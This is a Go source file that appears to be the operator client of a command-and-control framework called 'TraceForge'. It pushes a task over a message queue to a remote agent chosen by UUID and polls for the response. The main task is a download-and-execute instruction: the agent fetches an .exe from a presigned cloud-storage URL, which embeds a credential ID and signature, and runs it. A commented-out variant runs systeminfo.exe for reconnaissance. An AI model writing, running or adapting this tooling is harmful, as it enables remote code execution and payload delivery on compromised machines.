package main

import (
	"TraceForge/internals/agent"
	"TraceForge/internals/mq"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/sirupsen/logrus"
)

func main() {
	logger := logrus.New()
	logger.SetFormatter(&logrus.TextFormatter{
		DisableColors: false,
		FullTimestamp: true,
	})
	logger.SetOutput(os.Stdout)
	logger.SetLevel(logrus.InfoLevel)

	serverURL := flag.String("url", "http://127.0.0.1:8888", "The URL of the queue")
	agentUUID := flag.String("uuid", "", "The UUID of the agent")
	plugin := flag.String("plugin", "example", "Plugin to call")

	// Parse command-line arguments
	flag.Parse()
	if *agentUUID == "" {
		fmt.Println("Usage: go run main.go -uuid <UUID>")
		return
	}

	client := mq.NewClient(*serverURL)

	url := "https://sbapp-poc.s3.fr-par.scw.cloud/uploads/0f04bc9d-6fea-405c-b26e-265cc2539ced.bin?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=SCWN11FX1JVQRF2EF59P%2F20241122%2Ffr-par%2Fs3%2Faws4_request&X-Amz-Date=20241122T205522Z&X-Amz-Expires=900&X-Amz-SignedHeaders=host&x-id=GetObject&X-Amz-Signature=716e24ed4c054d8fa00e492b9d1bdffe3c246a5f5d4748803c3afb70064dab16"
	task, err := agent.NewTask(*plugin, agent.DlExecPluginArgs{
		URL:  url,
		Ext:  "exe",
		Args: []string{},
	})
	// task, err := agent.NewTask(*plugin, agent.ExecPluginArgs{
	// 	Name: "systeminfo.exe",
	// 	Args: []string{},
	// })
	if err != nil {
		logger.WithError(err).Fatal("Failed to create task")
	}
	// task := agent.Task{
	// 	TaskID: uuid.NewString(),
	// 	Plugin: *plugin,
	// 	Data: map[string]string{
	// 		"msg": "test",
	// 	},
	// }

	value, err := json.Marshal(task)
	if err != nil {
		logger.WithError(err).Error("failed to marshal task")
		return
	}

	client.PushMessage(*agentUUID, string(value))

	for {
		if getResponse(logger, client, task.TaskID) {
			break
		}
		time.Sleep(1 * time.Second)
	}
}

func getResponse(logger *logrus.Logger, client *mq.Client, taskID string) bool {
	msg, err := client.PullMessage(taskID)
	if err != nil {
		logger.WithError(err).Error("Failed to pull message")
		return false
	}

	if msg == nil {
		logger.Info("No messages available")
		return false
	}
	var response agent.ExecPluginResponse
	if err := json.Unmarshal([]byte(msg.Body), &response); err != nil {
		logger.WithError(err).Error("failed to parse message body")
	}

	// Process the task
	logger.WithFields(logrus.Fields{"task_id": taskID, "response": response}).Debug("response")
	fmt.Printf("status: %s\n", response.Status)
	fmt.Printf("message: %s\n", response.Message)
	fmt.Print(response.Output)
	err = client.DeleteMessage(msg.ID)
	if err != nil {
		logger.WithError(err).Error("Failed to delete message")
		return false
	}

	return true
}
